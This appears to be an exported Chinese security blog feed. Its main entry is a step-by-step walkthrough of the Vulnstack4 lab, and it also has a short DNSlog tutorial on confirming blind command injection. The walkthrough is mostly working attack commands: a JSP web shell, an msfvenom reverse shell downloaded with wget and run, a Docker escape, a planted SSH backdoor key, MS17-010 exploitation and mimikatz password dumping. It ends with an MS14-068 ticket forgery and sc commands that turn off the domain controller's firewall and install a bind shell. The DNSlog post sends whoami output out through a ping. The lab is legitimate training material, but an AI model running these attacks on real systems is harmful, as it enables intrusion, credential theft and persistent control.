<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">涉及到的内容：</span><br><span class="line"></span><br><span class="line">st漏洞利用</span><br><span class="line"></span><br><span class="line">phpmyadmin getshell</span><br><span class="line"></span><br><span class="line">tomcat 漏洞利用</span><br><span class="line"></span><br><span class="line">docker逃逸</span><br><span class="line"></span><br><span class="line">ms14-068</span><br><span class="line"></span><br><span class="line">ssh密钥利用</span><br><span class="line"></span><br><span class="line">流量转发</span><br><span class="line"></span><br><span class="line">历史命令信息泄露</span><br><span class="line"></span><br><span class="line">域渗透</span><br></pre></td></tr></table></figure>

<h2 id="第一个shell"><a href="#第一个shell" class="headerlink" title="第一个shell"></a>第一个shell</h2><h3 id="目标端口探测"><a href="#目标端口探测" class="headerlink" title="目标端口探测"></a>目标端口探测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -T4 -sV &lt;target&gt;</span><br></pre></td></tr></table></figure>

<h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit &lt;服务名&gt; &lt;版本号&gt;  //搜索该服务指定版本的漏洞</span><br><span class="line">searchsploit -m &lt;路径&gt;           // 将利用脚本移动到当前目录</span><br></pre></td></tr></table></figure>

<h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struts 2</span><br><span class="line">tomcat</span><br><span class="line">phpmyadmin</span><br><span class="line">三选一</span><br></pre></td></tr></table></figure>

<h4 id="利用tomcat"><a href="#利用tomcat" class="headerlink" title="利用tomcat"></a>利用tomcat</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// -F &quot;file=@&#123;FILE_NAME&#125;&quot; 指定上传文件</span><br><span class="line">curl -v -X PUT -F &quot;file=@shell.jsp&quot; 192.168.0.105:2002/shell.jsp/</span><br><span class="line"></span><br><span class="line">//或者searchsploit</span><br><span class="line">python3 42966.py -u http://192.168.0.105:2002/ -p pwn</span><br></pre></td></tr></table></figure>

<p>shell.jsp内容如下:</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*,java.net.*&quot;</span>%&gt;&lt;%%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=<span class="string">&quot;POST&quot;</span> NAME=<span class="string">&quot;myform&quot;</span> ACTION=<span class="string">&quot;&quot;</span>&gt;&lt;INPUT TYPE=<span class="string">&quot;text&quot;</span> NAME=<span class="string">&quot;cmd&quot;</span>&gt;&lt;INPUT TYPE=<span class="string">&quot;submit&quot;</span> VALUE=<span class="string">&quot;Send&quot;</span>&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%<span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123; out.println(<span class="string">&quot;Command: &quot;</span> + request.getParameter(<span class="string">&quot;cmd&quot;</span>) + <span class="string">&quot;\n&lt;BR&gt;&quot;</span>); <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> p.getOutputStream(); <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> p.getInputStream(); <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(in); <span class="type">String</span> <span class="variable">disr</span> <span class="operator">=</span> dis.readLine(); <span class="keyword">while</span> ( disr != <span class="literal">null</span> ) &#123; out.println(disr); disr = dis.readLine(); &#125; &#125;%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/DswCnblog/p/5780389.html">proc目录详解</a></p>
<h3 id="获得高级shell"><a href="#获得高级shell" class="headerlink" title="获得高级shell"></a>获得高级shell</h3><p>目的：为了方便后渗透集成化操作</p>
<h4 id="操作方式："><a href="#操作方式：" class="headerlink" title="操作方式："></a>操作方式：</h4><p>生成msf马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=193.122.122.123 LPORT=4444 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>开启http服务提供下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.servers 8080</span><br></pre></td></tr></table></figure>

<p>利用之前上传的shell.jsp执行wget命令下载开启监听然后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.0.108:8000/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getuid # 查看权限</span><br><span class="line">ifconfig # 查看网络配置</span><br><span class="line">fidsk -l # 查看硬盘</span><br><span class="line">拿到主机权限后要进行主机的信息收集</span><br><span class="line">uname -a # 获取所有版本信息</span><br><span class="line">uname -m # 获取Linux内核架构</span><br><span class="line">cat /proc/version # 获取内核信息</span><br><span class="line">cat /etc/*-release # 发布信息</span><br><span class="line">cat /etc/issue # 发布信息</span><br><span class="line">hostname # 获取主机名</span><br><span class="line">cat /etc/passwd # 列出系统所有用户</span><br><span class="line">cat /etc/group # 列出系统所有组 </span><br><span class="line">w # 查看目前登录的用户</span><br><span class="line">whoami # 查看当前用户 </span><br><span class="line">id # 查看当前用户信息 </span><br><span class="line">sudo -l # 列出目前用户可执行与无法执行的指令 </span><br><span class="line">ps aux # 查看进程信息 </span><br><span class="line">ls -la /etc/cron* # 查看计划任务</span><br><span class="line">ifconfig -a # 列出网络接口信息 </span><br><span class="line">cat /etc/network/interfaces # 列出网络接口信息 </span><br><span class="line">arp -a # 查看系统arp表 </span><br><span class="line">route # 打印路由信息</span><br><span class="line">netstat -anplt # 打印本地端口开放信息 </span><br><span class="line">iptables -L # 列出iptable的配置规则</span><br><span class="line"></span><br><span class="line">常见提权：</span><br><span class="line">sudo</span><br><span class="line">脏牛</span><br></pre></td></tr></table></figure>

<h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;run persistence -h</span><br></pre></td></tr></table></figure>

<p>通过ifconfig推测为docker虚拟机，查看cgroup确认是docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/self/cgroup</span><br></pre></td></tr></table></figure>

<h2 id="第二个shell"><a href="#第二个shell" class="headerlink" title="第二个shell"></a>第二个shell</h2><h3 id="尝试docker逃逸"><a href="#尝试docker逃逸" class="headerlink" title="尝试docker逃逸"></a>尝试docker逃逸</h3><p><a href="https://www.cnblogs.com/xiaozi/p/13423853.html">相关文档</a></p>
<h4 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h4><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">CVE-2019-5736-POC</a>缺点是需要等待管理员重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<h4 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h4><p>利用–privileged特权模式逃逸</p>
<blockquote>
<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
</blockquote>
<p>查看<code>ls /dev</code>看到&#x2F;dev目录会发现很多设备文件</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/e99c0b34daafee7ec78f86a6556edbce.png" alt="截图"></p>
<p>首先我们现在docker中新建一个&#x2F;hack目录用来挂载文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /zain</span><br><span class="line">mount /dev/sda1 /zain</span><br></pre></td></tr></table></figure>

<p><code>ls /zain</code>成功挂载，此时我们就可以通过访问容器内部的&#x2F;hack路径来达到访问整个宿主机的目的</p>
<h4 id="写入密钥"><a href="#写入密钥" class="headerlink" title="写入密钥"></a>写入密钥</h4><p>本地在当前目录生成ssh密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f backdoor</span><br></pre></td></tr></table></figure>

<p>前面说了，将sda1挂载成功，我们就可以通过访问容器内部的&#x2F;zain路径来达到访问整个宿主机的目的，比如我们访问&#x2F;zain&#x2F;home目录也就是访问宿主机的&#x2F;home目录，接下来将密钥写入目标机：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /zain/home/ubuntu</span><br><span class="line">ls -alh</span><br></pre></td></tr></table></figure>

<p>我们看见了一个.ssh目录，我们也就是要将ssh秘钥写入到.ssh目录里面并将文件命名为authorized_keys（目标机.ssh目录权限必须为700）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -avx /zain/home/ubuntu/.ssh/id_rsa.pub /zain/home/ubuntu/.ssh/authorized_keys # -avx是将权限也一起复制</span><br><span class="line">echo &gt; /zain/home/ubuntu/.ssh/authorized_keys # 清空authorized_keys文件</span><br><span class="line">echo &#x27;生成的.pub文件的内容&#x27; &gt; /zain/home/ubuntu/.ssh/authorized_keys # 将ssh秘钥写入authorized_keys文件</span><br></pre></td></tr></table></figure>

<p>查看密钥是否写入成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /zain/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>此时，就可以利用自己的私钥进行免密登陆目标宿主机了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i backdoor ubuntu@192.168.2.186</span><br></pre></td></tr></table></figure>

<p><strong>此时边界机器已经被拿下</strong></p>
<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>发现存在内网网段</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/715aa6cccca58dc7a364706be8fa2d60.png" alt="截图"></p>
<p>再次下载之前生成的木马，反弹一个meterpreter回来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.0.108:8000/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">nohup ./shell.elf &amp;</span><br></pre></td></tr></table></figure>

<p>获取shell后信息收集：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route # 查看路由信息</span><br><span class="line">arp # 查看arp缓存</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/5105fb2b993a855c8bcef67a84b0c689.png" alt="截图"></p>
<h2 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h2><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全局加路由</span><br><span class="line">route add 192.168.183.0 255.255.255.0</span><br><span class="line"># meterpreter shell加路由</span><br><span class="line">run autoroute -s 192.168.183.0/24</span><br><span class="line"># 查看路由信息</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line"># 此时仅msf可以进内网</span><br></pre></td></tr></table></figure>

<p>在实际的内网渗透中，我们可以直接添加到 0.0.0.0&#x2F;0 的路由。这样，只要该被控主机可达的地址就都可达</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db_nmap -sT -Pn 192.168.183.129</span><br><span class="line">db_nmap -sT -Pn 192.168.183.130</span><br><span class="line">services</span><br></pre></td></tr></table></figure>

<h3 id="创建代理"><a href="#创建代理" class="headerlink" title="创建代理"></a>创建代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"># srvhost 默认0.0.0.0就是监听本机了</span><br><span class="line"># 端口一般默认1080</span><br></pre></td></tr></table></figure>

<p>此时通过本机的1080就可以走msf建立的通道访问到内网的服务了</p>
<p>编辑本地代理服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line"># 修改为msf代理监听的端口</span><br></pre></td></tr></table></figure>

<p>扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT 192.168.183.129</span><br><span class="line"># -sT tcp扫描</span><br><span class="line"># -Pn 跳过主机发现</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/2f9b538decf6548915c45b9f29e57c5e.png" alt="截图"></p>
<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/d5e663662f7726d1cf86b1ee89668cf9.png" alt="截图"></p>
<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/06963f89d3658ac452935f975d35d704.png" alt="截图"></p>
<h3 id="扫描永恒之蓝漏洞"><a href="#扫描永恒之蓝漏洞" class="headerlink" title="扫描永恒之蓝漏洞"></a>扫描永恒之蓝漏洞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">check 192.168.183.129-130</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/14b4571e9f03498a5bfe3a089dab5947.png" alt="截图"></p>
<p>此时需要建立代理来打：</p>
<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>ew容易出现超时不操作就会自动断开的问题，这里推荐一款工具chisel</p>
<p><a href="https://github.com/jpillora/chisel">chisel下载地址</a></p>
<p>在目标web服务器上传chisel_for_linux64，然后执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./chisel_for_linux64 server -p 2333 --socks5</span><br></pre></td></tr></table></figure>

<p>攻击机执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./chisel_for_linux64 client 192.168.2.186:2333 sock</span><br></pre></td></tr></table></figure>

<p>选择ms17-010</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setg Proxies socks5:[ip]:[端口]设置代理</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp //正向连接</span><br><span class="line">set port 4444</span><br><span class="line">set rhost 192.168.183.136</span><br><span class="line">set AutoRunScript post/windows/manage/migrate //自动迁移进程</span><br></pre></td></tr></table></figure>

<h4 id="方法2-推荐"><a href="#方法2-推荐" class="headerlink" title="方法2(推荐)"></a>方法2(推荐)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole //新建一个代理中的msfconsole（因为是在公网的vps上开的代理，所以可以在内网机器中开）</span><br></pre></td></tr></table></figure>

<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/f23fe8bc79c7b7917cbb04f8bf27a231.png" alt="截图"></p>
<p>成功，而且很稳定</p>
<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/3174788fb0670c44a30563a1db32fc7a.png" alt="截图"></p>
<p>但是没法获取交互式shell，只能在meterpreter shell中操作，如果想获取交互式shell，则需要创建后门，然后通过代理正向连接后门：</p>
<blockquote>
<p>meterpreter&gt; run persistence -i 10 -X -p 4000 -P windows&#x2F;meterpreter&#x2F;bind_tcp</p>
<br>

<p>msf&gt; use exploit&#x2F;multi&#x2F;handle</p>
<p>msf&gt; set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p>
<p>msf&gt; set rhost 192.168.183.145</p>
<p>msf&gt; set lport 4000</p>
<p>msf&gt; setg proxies socks5:127.0.0.1:1080</p>
<p>msf&gt; run</p>
</blockquote>
<h3 id="降权"><a href="#降权" class="headerlink" title="降权"></a>降权</h3><p>因为在域中，不是域用户没有权限执行域命令，所以需要降权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getuid #查看当前token</span><br><span class="line">use incognito #加载incognito</span><br><span class="line">list_tokens -u #列出AccessToken</span><br><span class="line">impersonate_token &quot;DEMO\douser&quot; #模拟DEMO\douser用户</span><br><span class="line">rev2self #返回到之前的AccessToken权限（降到DEMO\douser）</span><br></pre></td></tr></table></figure>

<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all 查看本机ip，所在域 </span><br><span class="line">route print 打印路由信息 </span><br><span class="line">net view 查看局域网内其他主机名 </span><br><span class="line">arp -a 查看arp缓存 </span><br><span class="line">whoami </span><br><span class="line">net start 查看开启了哪些服务 </span><br><span class="line">net share 查看开启了哪些共享 </span><br><span class="line">net share ipc$ 开启ipc共享 </span><br><span class="line">net share c$ 开启c盘共享 </span><br><span class="line">net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot; 与192.168.xx.xx建立空连接 </span><br><span class="line">net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot; 建立c盘共享 </span><br><span class="line">dir \\192.168.xx.xx\c$\user 查看192.168.xx.xx c盘user目录下的文件 </span><br><span class="line">net config Workstation 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 </span><br><span class="line">net user 查看本机用户列表 </span><br><span class="line">net user /domain 查看域用户 </span><br><span class="line">net localgroup administrators 查看本地管理员组（通常会有域用户） </span><br><span class="line">net view /domain 查看有几个域 </span><br><span class="line">net user 用户名 /domain 获取指定域用户的信息 </span><br><span class="line">net group /domain 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） </span><br><span class="line">net group 组名 /domain 查看域中某工作组 </span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员的名字 </span><br><span class="line">net group &quot;domain computers&quot; /domain 查看域中的其他主机名 </span><br><span class="line">net group &quot;doamin controllers&quot; /domain 查看域控制器（可能有多台）</span><br></pre></td></tr></table></figure>

<h3 id="利用ms14-067攻击域控"><a href="#利用ms14-067攻击域控" class="headerlink" title="利用ms14-067攻击域控"></a>利用ms14-067攻击域控</h3><h4 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; upload mimikatz.exe #上传mimikatz</span><br><span class="line">meterpreter&gt; getsystem #提权至system</span><br><span class="line">meterpreter&gt; shell #获取系统交互shell</span><br><span class="line">&gt;mimikatz.exe #运行mimikatz</span><br><span class="line">mimikatz # privilege::debug #启用调试模式</span><br><span class="line">mimikatz # sekurlsa::logonpasswords #抓取密码和账户信息</span><br></pre></td></tr></table></figure>

<h4 id="利用ms14-068生成票据"><a href="#利用ms14-068生成票据" class="headerlink" title="利用ms14-068生成票据"></a>利用ms14-068生成票据</h4><blockquote>
<p>ms14-068.exe -u 域成员名-s 域成员sid -d 域控制器ip地址 -p 域成员密码</p>
<p>mimikatz注入票据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc &lt;生成的票据文件&gt; //将票据注入到内存中</span><br><span class="line"></span><br><span class="line">利用/验证</span><br><span class="line">&gt; net use \\win-ens2vr5tr3n(域控机器名)</span><br><span class="line">&gt; dir \\win-ens2vr5tr3n\c$ (列出c盘)</span><br><span class="line">&gt; copy c:\windows\system32\bind.exe \\WIN-ENS2VR5TR3N\c$ (上传木马)</span><br><span class="line"></span><br><span class="line">关闭防火墙</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br><span class="line"></span><br><span class="line">创建msf马</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\bind.exe&quot;</span><br><span class="line">&gt; sc \\WIN-ENS2VR5TR3N start bindshell</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83-Vulnstack4/a8e3a6217a132d777b4bde180d3d4ad4.png" alt="截图"></p>
<h4 id="上传mimikatz抓取密码"><a href="#上传mimikatz抓取密码" class="headerlink" title="上传mimikatz抓取密码"></a>上传mimikatz抓取密码</h4><br>

<h2 id="完"><a href="#完" class="headerlink" title="完"></a>完</h2>]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>白嫖机场教程</title>
    <url>/%E7%99%BD%E5%AB%96%E6%9C%BA%E5%9C%BA%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="69f52aa5a892bb0ce36e98b251a015f5448895ea2ce4a6b22517b9bd60911a42"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>代理工具</category>
      </categories>
      <tags>
        <tag>private</tag>
        <tag>代理</tag>
        <tag>机场</tag>
      </tags>
  </entry>
  <entry>
    <title>通过DNSLOG回显验证漏洞</title>
    <url>/%E9%80%9A%E8%BF%87DNSLOG%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="通过DNSLOG回显验证漏洞"><a href="#通过DNSLOG回显验证漏洞" class="headerlink" title="通过DNSLOG回显验证漏洞"></a>通过DNSLOG回显验证漏洞</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>   实际渗透测试中，有些漏洞因为没有回显导致无法准确判断漏洞是否存在，可能导致渗透测试人员浪费大量精力在一个并不存在的漏洞上，因此为了验证一些无回显漏洞，可结合DNSlog平台进行测试，本文使用的DNSlog平台链接如下：*<code>http://dnslog.cn/</code>*</p>
<span id="more"></span>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>   DNSlog检测原理在此就不多赘述了，网上相关资料铺天盖地，此处引用一张FREEBUF的图用以说明，此图现在看不懂没关系，当做完实验后再返回查看本图思维就会很清晰了。</p>
<img src="/%E9%80%9A%E8%BF%87DNSLOG%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/b0ff3e1034678bfb3a3916c298017a22.png" alt="截图" style="zoom:75%;">

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="1-安装Docker"><a href="#1-安装Docker" class="headerlink" title="1. 安装Docker"></a>1. 安装Docker</h4><p>   接下来直接搭建靶场，进入实验环境，本实验使用Docker搭建漏洞环境，操作系统是windows 10，Docker Desktop提供了较为完善的图形化操作界面，且兼容性随着版本更新目前已经与linux下运行的Docker无区别，安装方式见官网，安装操作较为简单，无脑下一步即可，安装完成后需要重启，接着按照说明一步步安装其他必备环境，这里就不再细说了。</p>
<h4 id="2-拉取镜像"><a href="#2-拉取镜像" class="headerlink" title="2.拉取镜像"></a>2.拉取镜像</h4><ul>
<li><p>打开CMD&#x2F;PowerShell运行以下命令：<code>docker pull ge592555078/lkwa</code>从仓库拉取镜像</p>
</li>
<li><p>接着打开Docker Desktop按照下图操作运行刚才拉取的环境，并<strong>将80端口映射到本地的81端口</strong>。</p>
<img src="/%E9%80%9A%E8%BF%87DNSLOG%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/3111cd1ef7c02bf6b47a8881f3faa4ca.png" alt="截图" style="zoom:35%;">
// *或者在命令行中直接输入`docker run -d -p 81:80 ge592555078/lkwa`*</li>
<li><p>此时访问<code>http://localhost:81/</code>应当出现apache的默认页面，证明环境搭建完成：</p>
<img src="/%E9%80%9A%E8%BF%87DNSLOG%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/3e4d6c91d42fadadd19d1a4ccfa2a3ff.png" alt="截图" style="zoom:40%;"></li>
</ul>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p> 由于主要学习dnslog的使用，我们就用环境中命令执行模块复现。</p>
<ol>
<li><p>访问<code>http://localhost:81/index.php</code>此为漏洞环境的主页</p>
</li>
<li><p>左侧选择<code>Bind RCE</code>命令注入环境</p>
</li>
<li><p>此时访问dnslog平台：<code>http://dnslog.cn/</code>点击页面上<code>Get SubDomain</code>生成专属子域名</p>
<img src="/%E9%80%9A%E8%BF%87DNSLOG%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/3145de6b932130e11c53905a765cee5d.png" alt="截图" style="zoom:35%;"></li>
<li><p>回到漏洞环境，在右侧命令执行输入框中输入如下命令之后点击<code>submit</code>按钮提交执行。*(whoami后应该衔接刚才生成的<strong>对应子域名</strong>)*</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping `whoami`.cp2wj5.dnslog.cn</span><br></pre></td></tr></table></figure></li>
<li><p>再返回DNSlog平台，点击刷新解析记录按钮，可以发现whoami的执行结果已经拼接成四级域名了：</p>
<img src="/%E9%80%9A%E8%BF%87DNSLOG%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E/be6d74075f765020a9979e8f4ff7a9ec.png" alt="截图" style="zoom:35%;">

<p> 至此为止试验结束。</p>
</li>
</ol>
<h3 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h3><p> 存在无回显漏洞的主机访问DNSlog平台就会留下DNS解析记录，可以通过DNS解析记录查看最终的执行结果，如示例中的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping `whoami`.cp2wj5.dnslog.cn</span><br><span class="line">此语句实际上等于是：</span><br><span class="line">ping www-data.yafjqc.dnslog.cn</span><br></pre></td></tr></table></figure>

<p> 包围着<code>whoami</code>的符号是反单引号，是<code>shift</code>+<code>~</code>组合打出来的符号，表示执行命令的意思，那么最终<code>ping</code>的结果就是<code>ping whoami执行后的主机名.随机三级域名.dnslog.cn</code>，解析的时候一层一层的迭代解析，最终指向<code>dnslog.cn</code>服务器上你的专属三级域名，并附带上执行结果*(四级域名)*，那么此时看dnslog服务器的DNS解析记录即可查看whoami的执行结果，如果对DNS协议不清楚此时应先去学习DNS解析原理，不然此篇文章学习起来较为吃力。</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
</search>
